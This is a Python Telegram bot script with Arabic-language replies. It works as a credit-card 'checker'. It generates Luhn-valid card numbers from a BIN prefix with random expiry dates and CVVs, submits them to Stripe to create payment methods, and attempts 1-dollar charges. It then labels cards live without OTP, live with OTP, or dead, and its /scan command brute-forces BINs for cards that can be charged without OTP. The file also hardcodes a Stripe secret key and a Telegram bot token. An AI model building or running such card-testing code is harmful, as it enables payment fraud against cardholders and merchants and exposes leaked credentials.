import telebot
import requests
import random
import time

STRIPE_KEY = "sk_test_51TDUSQRVEHIuXwVW5wClVDmNWk54qAvBQ6f1lLlXftxghl9jbDasH6XbTBs86XLamuRMQUkm3qGRQmpOFLu7bfNA00q3pACtNg"
BOT_TOKEN = "7662450317:AAHOQUXKWf4e4Zzs9oWhFkbguLBwS_QvM4Q"
bot = telebot.TeleBot(BOT_TOKEN)

try:
    bot.delete_webhook()
    print("Webhook deleted")
except:
    pass

def gen_card(bin_prefix):
    remaining = ''.join([str(random.randint(0,9)) for _ in range(9)])
    card = bin_prefix[:6] + remaining
    digits = [int(d) for d in card]
    for i in range(len(digits)-1, -1, -1):
        if i % 2 == 0:
            digits[i] *= 2
            if digits[i] > 9:
                digits[i] -= 9
    check = (10 - (sum(digits) % 10)) % 10
    full = card + str(check)
    month = str(random.randint(1,12)).zfill(2)
    year = str(random.randint(2025,2029))
    cvv = str(random.randint(100,999))
    return f"{full}|{month}|{year}|{cvv}"

def check_card(card_str):
    try:
        parts = card_str.split('|')
        card, month, year, cvv = parts
        url = "https://api.stripe.com/v1/payment_methods"
        headers = {"Authorization": f"Bearer {STRIPE_KEY}"}
        data = {
            "type": "card",
            "card[number]": card,
            "card[exp_month]": month,
            "card[exp_year]": year,
            "card[cvc]": cvv
        }
        r = requests.post(url, headers=headers, data=data, timeout=15)
        if r.status_code != 200:
            return "DEAD"
        pm_id = r.json().get('id')
        pay_url = "https://api.stripe.com/v1/payment_intents"
        pay_data = {
            "amount": 100,
            "currency": "usd",
            "payment_method": pm_id,
            "confirm": "true"
        }
        pr = requests.post(pay_url, headers=headers, data=pay_data, timeout=15)
        if pr.status_code == 200:
            status = pr.json().get('status')
            if status == 'succeeded':
                return "LIVE_NO_OTP"
            elif status == 'requires_action':
                return "LIVE_WITH_OTP"
        error = pr.json().get('error', {})
        if error.get('code') == 'insufficient_funds':
            return "LIVE_NO_OTP"
        return "DEAD"
    except:
        return "DEAD"

@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, "🌟 بوت فحص Stripe\n/scan <BIN>\n/gen <BIN>\n/otp رقم|شهر|سنة|رمز")

@bot.message_handler(commands=['gen'])
def gen_cmd(msg):
    try:
        parts = msg.text.split()
        bin_prefix = parts[1] if len(parts) > 1 else "424242"
        cards = [gen_card(bin_prefix) for _ in range(10)]
        bot.reply_to(msg, "🎴 10 بطاقات:\n" + "\n".join(cards))
    except Exception as e:
        bot.reply_to(msg, f"خطأ: {e}")

@bot.message_handler(commands=['otp'])
def otp_cmd(msg):
    try:
        data = msg.text.replace('/otp', '').strip()
        if '|' not in data:
            bot.reply_to(msg, "❌ /otp رقم|شهر|سنة|رمز")
            return
        parts = data.split('|')
        if len(parts) != 4:
            bot.reply_to(msg, "❌ 4 أجزاء")
            return
        card_str = data.strip()
        bot.reply_to(msg, f"⏳ فحص...\n{card_str}")
        result = check_card(card_str)
        if result == "LIVE_NO_OTP":
            bot.reply_to(msg, f"✅ LIVE - لا تطلب OTP\n{card_str}")
        elif result == "LIVE_WITH_OTP":
            bot.reply_to(msg, f"🟡 LIVE - تتطلب OTP\n{card_str}")
        else:
            bot.reply_to(msg, f"❌ DEAD\n{card_str}")
    except Exception as e:
        bot.reply_to(msg, f"خطأ: {e}")

@bot.message_handler(commands=['scan'])
def scan_cmd(msg):
    try:
        parts = msg.text.split()
        if len(parts) < 2:
            bot.reply_to(msg, "❌ /scan <BIN>")
            return
        bin_prefix = parts[1][:6]
        count = 10
        if len(parts) > 2:
            try:
                count = int(parts[2])
                count = max(3, min(count, 15))
            except:
                pass
        bot.reply_to(msg, f"🔍 فحص BIN {bin_prefix}\n{count} بطاقة...")
        cards = [gen_card(bin_prefix) for _ in range(count)]
        live = []
        for card in cards:
            result = check_card(card)
            if result == "LIVE_NO_OTP":
                live.append(card)
            time.sleep(0.5)
        if live:
            bot.reply_to(msg, f"⚠️ {len(live)} بطاقة LIVE بدون OTP:\n" + "\n".join(live[:10]))
        else:
            bot.reply_to(msg, f"✅ BIN {bin_prefix} آمن")
    except Exception as e:
        bot.reply_to(msg, f"خطأ: {e}")

print("🚀 البوت شغال...")
bot.infinity_polling()
